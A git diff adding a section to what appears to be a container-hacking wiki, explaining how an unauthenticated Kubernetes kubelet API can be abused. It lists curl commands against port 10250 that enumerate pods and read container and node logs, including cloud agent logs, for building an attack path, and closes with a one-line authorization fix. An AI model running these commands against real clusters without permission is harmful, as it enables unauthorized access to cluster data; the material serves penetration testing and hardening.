@@ -7,6 +7,7 @@
   - [Kubernetes](#kubernetes)
     - [Retrieving secrets](#retrieving-secrets)
       - [Service Account secrets](#service-account-secrets)
+      - [Interacting with kubelet](#interacting-with-kubelet)
 
 This wiki aims to summarize many of the most interesting hacking and discovery approaches to identify and exploit missconfigurations in containerized environments.
 Check [Container Security In Depth](../../container-security-in-depth.md) for understanding proper security measures to be applied to reduce the risk and likelihood of success of an attacker.
@@ -110,3 +111,45 @@ done
 
 > \[!CAUTION\]
 > Notice that not all the returns are successful. As explained in other chapter, using secure images can reduce the attack surface. There are very limited images such as the ones built from scratch or distroless that do not have even `ls` or `cat` commands available. It could also happen that the system calls are filtered with `seccomp`. Having said that, as you notice in the screenshot, having exec permissions is quite critical to be able to retrieve majority of the secrets of the cluster and therefore the RBAC must be well defined and tight to protect the organization.
+
+#### Interacting with kubelet
+
+If kubelet service is not authorized (it is not common, but could happen) we may be able to interact with the api to compromise the cluster.
+
+There is no documentation about the API perse available for the public. However the code is available here: [Kubelet server](https://github.com/kubernetes/kubernetes/blob/4a6935b31fcc4d1498c977d90387e02b6b93288f/pkg/kubelet/server/server.go). The api definitions and the routes are exposed here.
+
+Useful reference: [Blog about kubelet API](https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html#logs)
+
+Examples:
+
+1. Retrieve pods running in node.
+
+```bash
+curl --insecure https://172.31.41.69:10250/pods
+```
+
+2. Get logs of pod and container.
+
+```bash
+curl --insecure https://172.31.41.69:10250/containerLogs/default/kube-hunter-2mhkq/kube-hunter
+```
+
+3. Get running pods
+
+```bash
+curl --insecure https://172.31.41.69:10250/runningpods
+```
+
+4. List all kubelet available logs. Including `user-data, calico, journal, pods, syslog, etc.`. Many relevant information that can help to build a successful exploitable path.
+
+```bash
+curl --insecure https://172.31.41.69:10250/logs/
+```
+
+5. Get specific logs:
+
+```bash
+curl --insecure https://172.31.41.69:10250/logs/amazon/ssm/errors.log
+```
+
+To fix this a proper authorization strategy must be present in kubelet configuration (`/var/lib/kubelet/config.yaml`)
